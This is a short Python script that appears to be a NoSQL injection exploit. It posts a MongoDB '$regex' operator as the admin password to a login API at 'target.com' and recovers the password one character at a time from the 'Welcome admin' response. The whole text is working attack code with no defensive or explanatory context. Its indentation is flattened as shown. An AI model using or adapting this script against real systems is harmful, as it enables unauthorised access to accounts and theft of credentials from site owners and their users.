import requests
import string
URL = "http://target.com/api/login"
CHARS = string.ascii_letters + string.digits + "!@#$%^&*()"
password = ""
while True:
for char in CHARS:
payload = {
"username": "admin",
"password": {"$regex": f"^{password}{char}"}
}
r = requests.post(URL, json=payload)
if "Welcome admin" in r.text:
password += char
print(f"Progress: {password}")
break
else:
print(f"Password found: {password}")
break
